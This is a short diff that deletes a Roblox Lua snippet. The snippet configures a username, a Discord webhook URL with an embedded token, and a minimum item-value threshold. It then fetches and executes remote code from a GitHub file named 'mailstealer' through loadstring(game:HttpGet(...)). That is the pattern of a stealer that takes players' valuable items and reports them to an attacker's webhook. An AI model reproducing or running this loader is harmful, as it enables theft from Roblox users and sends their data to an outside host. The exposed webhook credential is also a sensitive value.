@@ -1,7 +1,0 @@
-Username= 'tuanhueh'
- 
-Webhook='https://discord.com/api/webhooks/1177247973319647382/0NJWaeIa2zJlse6Z2HG2ECa0NlgBc1-iEU81ICqFX1NTm9T2XkTgVhKc14X9x18QVFZ-'
-
-MinimumRAP = 10000
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Utilz/main/lua/rblx/AuroraTils/mailstealer'))()
